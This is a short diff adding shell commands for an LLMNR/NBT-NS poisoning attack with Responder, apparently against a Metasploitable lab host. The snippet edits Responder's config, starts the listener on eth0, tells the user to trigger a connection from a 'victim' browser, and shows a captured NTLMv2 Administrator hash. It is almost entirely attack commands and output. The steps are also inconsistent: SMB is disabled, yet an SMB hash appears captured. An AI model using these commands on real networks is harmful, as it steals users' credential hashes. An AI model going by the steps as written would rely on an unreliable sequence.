@@ -1,0 +1,12 @@
+# Disable SMB/HTTP in Responder config
+echo "SMB = Off" >> /etc/responder/Responder.conf
+echo "HTTP = Off" >> /etc/responder/Responder.conf
+
+# Terminal 1: Responder listener
+sudo responder -I eth0 -wrd
+
+# Terminal 2: Trigger from victim browser (\\192.168.1.200\share)
+# or ping 192.168.1.200 to poison NBT-NS
+
+# Output captured:
+"[SMB] NTLMv2 Hash: METASPLOITABLE::Administrator:1122334455667788:..."
